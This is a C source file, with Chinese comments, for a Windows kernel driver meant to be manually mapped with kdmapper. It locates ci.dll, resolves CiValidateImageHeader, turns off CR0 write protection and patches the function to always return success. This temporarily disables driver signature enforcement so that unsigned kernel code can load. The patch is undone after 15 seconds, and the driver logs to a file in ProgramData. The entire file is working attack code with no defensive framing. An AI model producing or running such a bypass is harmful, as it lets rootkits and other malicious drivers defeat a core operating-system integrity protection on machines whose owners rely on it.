// cioff2.c -- kdmapper 映射的桥接驱动（不创建任何设备对象）
//   1) 找 ci.dll 基址（PsLoadedModuleList）
//   2) 解析导出表拿 CiValidateImageHeader
//   3) 关 CR0.WP，把序言改成 `mov eax,0; ret`（返回 STATUS_SUCCESS）
//   4) 15 秒后自动还原
// 日志：C:\ProgramData\kmaplog.txt
#include <ntifs.h>
#include <ntstrsafe.h>
#include <ntimage.h>

static LIST_ENTRY* g_psloaded = NULL;
static PVOID       g_target = NULL;
static UCHAR       g_orig[8];
static BOOLEAN     g_patched = FALSE;

static VOID KLog(PCSTR text)
{
    UNICODE_STRING path; OBJECT_ATTRIBUTES oa; IO_STATUS_BLOCK iosb; HANDLE h; size_t len = 0;
    RtlInitUnicodeString(&path, L"\\??\\C:\\ProgramData\\kmaplog.txt");
    InitializeObjectAttributes(&oa, &path, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    if (!NT_SUCCESS(ZwCreateFile(&h, FILE_APPEND_DATA | SYNCHRONIZE, &oa, &iosb, NULL,
                                 FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF,
                                 FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0)))
        return;
    RtlStringCchLengthA(text, 1024, &len);
    ZwWriteFile(h, NULL, NULL, NULL, &iosb, (PVOID)text, (ULONG)len, NULL, NULL);
    ZwClose(h);
}

static VOID KLogF(PCSTR fmt, ...)
{
    CHAR buf[512]; va_list ap;
    va_start(ap, fmt);
    RtlStringCchVPrintfA(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    KLog(buf);
}

static PVOID FindModuleBase(PCWSTR name, PULONG outSize)
{
    LIST_ENTRY* head = g_psloaded;
    LIST_ENTRY* cur;
    if (!head) return NULL;
    for (cur = head->Flink; cur != head && cur; cur = cur->Flink)
    {
        PUCHAR e = (PUCHAR)cur;
        USHORT nameLen = *(USHORT*)(e + 0x58);
        PWCH   nameBuf = *(PWCH*)(e + 0x60);
        if (nameLen && nameBuf)
        {
            UNICODE_STRING u, want;
            u.Buffer = nameBuf; u.Length = nameLen; u.MaximumLength = nameLen;
            RtlInitUnicodeString(&want, name);
            if (RtlEqualUnicodeString(&u, &want, TRUE))
            {
                if (outSize) *outSize = *(ULONG*)(e + 0x40);
                return *(PVOID*)(e + 0x30);
            }
        }
    }
    return NULL;
}

static PVOID FindExport(PVOID base, PCSTR wanted)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_EXPORT_DIRECTORY pexp;
    ULONG* names; USHORT* ords; ULONG* funcs;
    ULONG i;

    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    nt = (PIMAGE_NT_HEADERS)((PUCHAR)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    if (!nt->OptionalHeader.DataDirectory[0].VirtualAddress) return NULL;

    pexp = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)base + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    names = (ULONG*)((PUCHAR)base + pexp->AddressOfNames);
    ords  = (USHORT*)((PUCHAR)base + pexp->AddressOfNameOrdinals);
    funcs = (ULONG*)((PUCHAR)base + pexp->AddressOfFunctions);

    if (pexp->NumberOfNames > 0x4000) return NULL;
    for (i = 0; i < pexp->NumberOfNames; i++)
    {
        PCSTR n = (PCSTR)((PUCHAR)base + names[i]);
        /* 内核无 strcmp，手写比较 */
        const CHAR* a = n; const CHAR* b = wanted;
        while (*a && *b && *a == *b) { a++; b++; }
        if (*a == 0 && *b == 0)
            return (PVOID)((PUCHAR)base + funcs[ords[i]]);
    }
    return NULL;
}

static VOID WriteBytesWp(PVOID addr, const UCHAR* data, ULONG len)
{
    ULONG64 cr0 = __readcr0();
    __writecr0(cr0 & ~0x10000ULL);          /* clear WP */
    RtlCopyMemory(addr, data, len);
    __writecr0(cr0);                        /* restore WP */
    KeMemoryBarrier();
}

static VOID RestoreThread(PVOID ctx)
{
    LARGE_INTEGER delay;
    UNREFERENCED_PARAMETER(ctx);
    delay.QuadPart = -150000000LL;          /* 15s */
    KeDelayExecutionThread(KernelMode, FALSE, &delay);
    if (g_patched && g_target)
    {
        WriteBytesWp(g_target, g_orig, sizeof(g_orig));
        KLog("[cioff2] restored CiValidateImageHeader\n");
    }
    PsTerminateSystemThread(STATUS_SUCCESS);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    PVOID ciBase, fn;
    ULONG ciSize = 0;
    HANDLE h = NULL;
    NTSTATUS st;
    UNICODE_STRING nm;
    UCHAR patch[8] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3, 0x90, 0x90 };  /* mov eax,0; ret; nop nop */

    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    KLog("\n[cioff2] === entry ===\n");

    RtlInitUnicodeString(&nm, L"PsLoadedModuleList");
    g_psloaded = (LIST_ENTRY*)MmGetSystemRoutineAddress(&nm);
    if (!g_psloaded) { KLog("[cioff2] no module list\n"); return STATUS_UNSUCCESSFUL; }

    ciBase = FindModuleBase(L"ci.dll", &ciSize);
    KLogF("[cioff2] ci.dll=%p size=0x%X\n", ciBase, ciSize);
    if (!ciBase) return STATUS_NOT_FOUND;

    fn = FindExport(ciBase, "CiValidateImageHeader");
    KLogF("[cioff2] CiValidateImageHeader=%p\n", fn);
    if (!fn) return STATUS_NOT_FOUND;

    RtlCopyMemory(g_orig, fn, sizeof(g_orig));
    KLogF("[cioff2] orig=%02X %02X %02X %02X\n", g_orig[0], g_orig[1], g_orig[2], g_orig[3]);

    g_target = fn;
    WriteBytesWp(fn, patch, sizeof(patch));
    g_patched = TRUE;
    KLog("[cioff2] patched -> return STATUS_SUCCESS\n");

    st = PsCreateSystemThread(&h, THREAD_ALL_ACCESS, NULL, NULL, NULL, RestoreThread, NULL);
    if (NT_SUCCESS(st) && h) ZwClose(h);
    KLogF("[cioff2] restore thread=0x%X\n", st);
    return STATUS_SUCCESS;
}
